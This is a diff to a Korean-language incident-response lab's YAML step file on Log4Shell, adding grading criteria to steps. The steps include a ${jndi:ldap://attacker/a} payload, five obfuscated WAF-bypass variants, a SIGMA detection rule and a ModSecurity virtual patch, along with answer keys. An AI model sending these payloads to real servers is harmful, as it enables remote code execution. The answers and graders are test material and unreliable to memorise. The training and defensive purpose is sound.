@@ -23,6 +23,21 @@ steps:
     type: output_contains
     expect: jndi
     field: stdout
+    semantic:
+      intent: '[공격] Log4Shell 기본 페이로드 — echo ''${jndi:ldap://attacker/a}'' > w06-log4shell.txt. CVE-2021-44228.
+        MITRE T1190. JNDI injection.'
+      success_criteria:
+      - jndi 키워드
+      - ${jndi:ldap:// 구문
+      - 기본 payload
+      acceptable_methods:
+      - ${jndi:ldap://}
+      - rmi 대체
+      - dns 대체
+      negative_signs:
+      - jndi 없음
+      - URL 없음
+      - 구문 오류
   target_vm: web
   script: echo '${jndi:ldap://attacker/a}' > /tmp/w06-log4shell.txt && cat /tmp/w06-log4shell.txt
   risk_level: low
@@ -52,6 +67,21 @@ steps:
     type: output_contains
     expect: jndi
     field: stdout
+    semantic:
+      intent: '[공격] 변형 페이로드 5종 — cat > w06-variants.txt: ${::-j} 분할 / ${lower:j} / ${env:BARFOO:-j} /
+        ${lower:ldap} / ${::-attacker}. WAF 우회 변형. Log4j 룩업 중첩.'
+      success_criteria:
+      - jndi 키워드
+      - 5 변형
+      - 문법 우회
+      acceptable_methods:
+      - 5 변형 기법
+      - Log4j lookup
+      - polymorphic payload
+      negative_signs:
+      - 변형 2개 이하
+      - 문법 단순
+      - 우회 맥락 없음
   target_vm: web
   script: 'cat > /tmp/w06-variants.txt <<''T''
 
@@ -75,18 +105,33 @@ steps:
   hint: 6단계 IR 중 탐지 단계. target_vm=siem.
   category: analysis
   points: 11
-  answer: "mkdir -p ~/w06 && cat > ~/w06/rule.yml <<'Y'\ntitle: Log4Shell JNDI burst\n\
-    detection:\n  selection:\n    payload|contains: ['${jndi:', '${${::-j}${::-n}']\n\
-    \  condition: selection\nlevel: critical\nY\ncat ~/w06/rule.yml"
+  answer: "mkdir -p ~/w06 && cat > ~/w06/rule.yml <<'Y'\ntitle: Log4Shell JNDI burst\ndetection:\n  selection:\n\
+    \    payload|contains: ['${jndi:', '${${::-j}${::-n}']\n  condition: selection\nlevel: critical\n\
+    Y\ncat ~/w06/rule.yml"
   answer_detail: '[탐지] JNDI 패턴 탐지.'
   verify:
     type: output_contains
     expect: jndi
     field: stdout
+    semantic:
+      intent: '[탐지] SIGMA Log4Shell — cat > rule.yml: payload contains [''${jndi:'', ''${${::-j}${::-n}'']
+        + level critical. JNDI 패턴 + 변형 탐지.'
+      success_criteria:
+      - jndi 키워드
+      - contains 배열
+      - critical
+      acceptable_methods:
+      - SIGMA contains
+      - Suricata content
+      - YARA
+      negative_signs:
+      - 패턴 1개
+      - critical 아님
+      - 변형 누락
   target_vm: siem
-  script: "mkdir -p ~/w06 && cat > ~/w06/rule.yml <<'Y'\ntitle: Log4Shell JNDI burst\n\
-    detection:\n  selection:\n    payload|contains: ['${jndi:', '${${::-j}${::-n}']\n\
-    \  condition: selection\nlevel: critical\nY\ncat ~/w06/rule.yml"
+  script: "mkdir -p ~/w06 && cat > ~/w06/rule.yml <<'Y'\ntitle: Log4Shell JNDI burst\ndetection:\n  selection:\n\
+    \    payload|contains: ['${jndi:', '${${::-j}${::-n}']\n  condition: selection\nlevel: critical\n\
+    Y\ncat ~/w06/rule.yml"
   risk_level: low
   bastion_prompt: ''
 - order: 4
@@ -110,6 +155,21 @@ steps:
     type: output_contains
     expect: KEV
     field: stdout
+    semantic:
+      intent: '[탐지] CISA KEV 구독 — cat > kev-feed.md: CISA KEV URL + 일일 자동 fetch + SBOM 매칭 시 경보. 실제 악용
+        CVE만 포함.'
+      success_criteria:
+      - KEV 키워드
+      - CISA URL
+      - 자동 fetch + SBOM 매칭
+      acceptable_methods:
+      - CISA KEV JSON
+      - EPSS score
+      - VulnCheck KEV
+      negative_signs:
+      - KEV 없음
+      - URL 누락
+      - SBOM 매칭 없음
   target_vm: bastion
   script: 'cat > ~/w06/kev-feed.md <<''M''
 
@@ -143,6 +203,21 @@ steps:
     - log4j
     - SBOM
     field: stdout
+    semantic:
+      intent: '[분석] SBOM JSON — cat > sbom.json: components log4j-core 2.14.1 + locations app-a/app-b.
+        CycloneDX/SPDX 호환. 분 단위 영향 평가.'
+      success_criteria:
+      - log4j/SBOM
+      - version 2.14.1
+      - locations
+      acceptable_methods:
+      - CycloneDX
+      - SPDX
+      - Syft 생성
+      negative_signs:
+      - version 없음
+      - locations 없음
+      - components 없음
   target_vm: bastion
   script: 'cat > ~/w06/sbom.json <<''J''
 
@@ -176,6 +251,21 @@ steps:
     - JNDI
     - 구분
     field: stdout
+    semantic:
+      intent: '[분석] 공격 시도 vs 성공 — cat > verify.md: 네트워크 JNDI 페이로드 관찰 / 시스템 비정상 ldap/rmi aws out / 앱 stack
+        trace JndiLookup. 3 증거.'
+      success_criteria:
+      - JNDI/구분
+      - 3 증거
+      - 성공 확인
+      acceptable_methods:
+      - Zeek DNS+conn
+      - EDR outbound
+      - Stack trace 분석
+      negative_signs:
+      - 증거 1-2개
+      - 성공 기준 없음
+      - 분석 없음
   target_vm: bastion
   script: 'cat > ~/w06/verify.md <<''M''
 
@@ -195,9 +285,8 @@ steps:
   hint: 6단계 IR 중 초동대응 단계. target_vm=web.
   category: analysis
   points: 15
-  answer: "cat > ~/w06/virtual-patch.rules <<'R'\nSecRule ARGS|REQUEST_HEADERS \\\n\
-    \  \"@rx \\\\$\\\\{jndi:\" \\\n  \"id:9001000,phase:2,deny,status:403\"\nR\ncat\
-    \ ~/w06/virtual-patch.rules"
+  answer: "cat > ~/w06/virtual-patch.rules <<'R'\nSecRule ARGS|REQUEST_HEADERS \\\n  \"@rx \\\\$\\\\{jndi:\"\
+    \ \\\n  \"id:9001000,phase:2,deny,status:403\"\nR\ncat ~/w06/virtual-patch.rules"
   answer_detail: '[초동대응] 2시간 내 배포.'
   verify:
     type: output_contains
@@ -205,10 +294,24 @@ steps:
     - jndi
     - 가상패치
     field: stdout
+    semantic:
+      intent: '[초동] Virtual Patch WAF — cat > virtual-patch.rules: SecRule ARGS|REQUEST_HEADERS @rx ''\${jndi:''
+        id 9001000 phase 2 deny status 403. 2시간 내 배포. ModSecurity.'
+      success_criteria:
+      - jndi/가상패치
+      - SecRule ARGS
+      - deny 403
+      acceptable_methods:
+      - ModSecurity SecRule
+      - CRS rules
+      - AWS WAF rule
+      negative_signs:
+      - SecRule 없음
+      - deny 없음
+      - 빠른 배포 맥락 없음
   target_vm: web
-  script: "cat > ~/w06/virtual-patch.rules <<'R'\nSecRule ARGS|REQUEST_HEADERS \\\n\
-    \  \"@rx \\\\$\\\\{jndi:\" \\\n  \"id:9001000,phase:2,deny,status:403\"\nR\ncat\
-    \ ~/w06/virtual-patch.rules"
+  script: "cat > ~/w06/virtual-patch.rules <<'R'\nSecRule ARGS|REQUEST_HEADERS \\\n  \"@rx \\\\$\\\\{jndi:\"\
+    \ \\\n  \"id:9001000,phase:2,deny,status:403\"\nR\ncat ~/w06/virtual-patch.rules"
   risk_level: low
   bastion_prompt: ''
 - order: 8
@@ -234,6 +337,21 @@ steps:
     type: output_contains
     expect: Virtual
     field: stdout
+    semantic:
+      intent: '[초동] Emergency Patch 결정 — cat > decision.md: 자산 노출 Y / 패치 호환성 N / SLA 수용 Y → Virtual Patch
+        + 주말 패치. 결정 흐름.'
+      success_criteria:
+      - Virtual 키워드
+      - 3 결정 축
+      - 흐름
+      acceptable_methods:
+      - 결정 트리
+      - Change Advisory Board
+      - Patch Tuesday
+      negative_signs:
+      - 축 1-2개
+      - 결정 없음
+      - 흐름 없음
   target_vm: bastion
   script: 'cat > ~/w06/decision.md <<''M''
 
@@ -255,9 +373,9 @@ steps:
   hint: 6단계 IR 중 초동대응 단계. target_vm=bastion.
   category: analysis
   points: 17
-  answer: "cat > ~/w06/agent.yaml <<'Y'\nplaybook_id: pb-nday-response\nsteps:\n \
-    \ - skill: fetch_cve_feed\n  - skill: match_sbom\n  - skill: deploy_virtual_patch\n\
-    \  - skill: open_emergency_patch_ticket\nY\ncat ~/w06/agent.yaml"
+  answer: "cat > ~/w06/agent.yaml <<'Y'\nplaybook_id: pb-nday-response\nsteps:\n  - skill: fetch_cve_feed\n\
+    \  - skill: match_sbom\n  - skill: deploy_virtual_patch\n  - skill: open_emergency_patch_ticket\n\
+    Y\ncat ~/w06/agent.yaml"
   answer_detail: '[초동대응] 자동 파이프라인.'
   verify:
     type: output_contains
@@ -265,10 +383,25 @@ steps:
     - virtual_patch
     - Playbook
     field: stdout
+    semantic:
+      intent: '[초동] Agent Playbook — cat > agent.yaml: pb-nday-response + fetch_cve_feed / match_sbom
+        / deploy_virtual_patch / open_emergency_patch_ticket. 자동 파이프라인.'
+      success_criteria:
+      - virtual_patch/Playbook
+      - 4 steps
+      - SBOM 매칭
+      acceptable_methods:
+      - Bastion Playbook
+      - Ansible patch
+      - Dependabot
+      negative_signs:
+      - steps 2개 이하
+      - SBOM 없음
+      - 자동화 없음
   target_vm: bastion
-  script: "cat > ~/w06/agent.yaml <<'Y'\nplaybook_id: pb-nday-response\nsteps:\n \
-    \ - skill: fetch_cve_feed\n  - skill: match_sbom\n  - skill: deploy_virtual_patch\n\
-    \  - skill: open_emergency_patch_ticket\nY\ncat ~/w06/agent.yaml"
+  script: "cat > ~/w06/agent.yaml <<'Y'\nplaybook_id: pb-nday-response\nsteps:\n  - skill: fetch_cve_feed\n\
+    \  - skill: match_sbom\n  - skill: deploy_virtual_patch\n  - skill: open_emergency_patch_ticket\n\
+    Y\ncat ~/w06/agent.yaml"
   risk_level: low
   bastion_prompt: ''
 - order: 10
@@ -294,6 +427,21 @@ steps:
     type: output_contains
     expect: Emergency
     field: stdout
+    semantic:
+      intent: '[보고] 임원 브리핑 — cat > exec.md: What CVE-YYYY-NNNNN 영향 12개 Bastion Virtual Patch / Impact
+        공격 시도 관찰 악용 증거 없음 / Ask Emergency Patch 야간 배포. 승인 요청.'
+      success_criteria:
+      - Emergency 키워드
+      - What+Impact+Ask
+      - CVE 식별
+      acceptable_methods:
+      - Markdown 1쪽
+      - CxO brief
+      - CVSS 근거
+      negative_signs:
+      - 섹션 부족
+      - CVE 없음
+      - Ask 없음
   target_vm: bastion
   script: 'cat > ~/w06/exec.md <<''M''
 
@@ -333,6 +481,21 @@ steps:
     type: output_contains
     expect: 48h
     field: stdout
+    semantic:
+      intent: '[재발방지] VulnOps SLA — cat > vulnops-sla.md: Virtual Patch 2h / Emergency Patch 48h / 정기
+        패치 15일 / SBOM 자동 생성 CI 통합. 조직 SLA.'
+      success_criteria:
+      - 48h 키워드
+      - 4 SLA
+      - CI 통합
+      acceptable_methods:
+      - NIST SP 800-40
+      - CIS 7
+      - VulnCheck SLA
+      negative_signs:
+      - SLA 2개 이하
+      - 48h 없음
+      - CI 없음
   target_vm: bastion
   script: 'cat > ~/w06/vulnops-sla.md <<''M''
 
@@ -370,6 +533,21 @@ steps:
     type: output_contains
     expect: CMDB
     field: stdout
+    semantic:
+      intent: '[재발방지] Shadow IT 스캔 — cat > shadow-it.md: DNS 로그 분석 / egress 통계 vs CMDB / 매주 diff 리뷰. 미파악
+        자산 탐지.'
+      success_criteria:
+      - CMDB 키워드
+      - DNS + egress + diff
+      - 주간 리뷰
+      acceptable_methods:
+      - Zeek DNS
+      - CMDB sync
+      - Netbox inventory
+      negative_signs:
+      - CMDB 없음
+      - diff 없음
+      - 주기 없음
   target_vm: bastion
   script: 'cat > ~/w06/shadow-it.md <<''M''
 
